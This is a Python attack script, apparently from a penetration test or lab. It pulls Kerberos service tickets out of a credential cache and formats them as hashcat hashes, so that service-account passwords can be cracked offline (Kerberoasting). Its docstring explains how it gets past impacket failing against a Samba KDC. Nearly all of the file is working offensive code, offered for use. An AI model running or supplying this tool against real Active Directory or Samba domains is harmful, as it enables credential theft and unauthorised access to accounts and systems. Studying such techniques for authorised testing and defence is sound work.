#!/usr/bin/env python3
"""krb5cc-to-hashcat.py — extract a hashcat -m 13100 (RC4 krb5tgs) hash from a Kerberos
credential cache that contains a service ticket obtained with `kvno <SPN>`.

Mirrors impacket's outputTGS RC4 format:
    $krb5tgs$23$*<user>$<realm>$<spn-with-~>*$<cipher[:16].hex()>$<cipher[16:].hex()>

Why this exists: impacket's GetUserSPNs.py builds a TGS-REQ whose authenticator checksum
Samba's Heimdal KDC rejects (KRB_AP_ERR_INAPP_CKSUM). Native `kinit`+`kvno` work fine and
land a usable service ticket in the ccache; this script turns that ccache into the hash
hashcat can crack.

Usage: krb5cc-to-hashcat.py <ccache> <service_account_name> [> hash.txt]
"""
import sys
import re
from impacket.krb5.ccache import CCache

if len(sys.argv) < 2:
    sys.exit("usage: krb5cc-to-hashcat.py <ccache> <account_name>")

path = sys.argv[1]
account = sys.argv[2] if len(sys.argv) > 2 else "service"

cc = CCache.loadFile(path)
emitted = False
for cred in cc.credentials:
    sp = bytes(cred.getServerPrincipal()).decode("latin-1", "replace")
    if "krbtgt" in sp:
        continue  # skip the TGT; we want the service ticket
    raw = cred.ticket.getData()
    # ccache v4 CountedOctetString: 4-byte length prefix, then the Ticket DER (starts 0x61)
    h = raw[4:].hex() if raw[:1] != b"\x61" else raw.hex()
    etypes = list(re.finditer(r"a0030201(..)", h))
    if not etypes:
        continue
    pos, etype = etypes[-1].start(), int(etypes[-1].group(1), 16)
    rem = h[pos:]
    # cipher OCTET STRING: long-form 04 82 LLLL, medium 04 81 LL, or short-form 04 LL
    m = (re.search(r"0482([0-9a-f]{4})([0-9a-f]+)", rem)
         or re.search(r"0481([0-9a-f]{2})([0-9a-f]+)", rem)
         or re.search(r"04([0-9a-f]{2})([0-9a-f]+)", rem))
    if not m:
        continue
    clen = int(m.group(1), 16) * 2
    cipher = m.group(2)[:clen]
    spn = sp.split("@")[0].replace(":", "~")
    realm = sp.split("@")[1] if "@" in sp else "SC.LOCAL"
    if etype not in (23, 3):  # not RC4-HMAC / DES
        sys.stderr.write("WARNING: etype %d -> use hashcat -m 19700/19800 (AES), not -m 13100\n" % etype)
    print("$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (etype, account, realm, spn, cipher[:32], cipher[32:]))
    emitted = True

if not emitted:
    sys.stderr.write("no service ticket found in %s (run `kvno <SPN>` first)\n" % path)
    sys.exit(1)
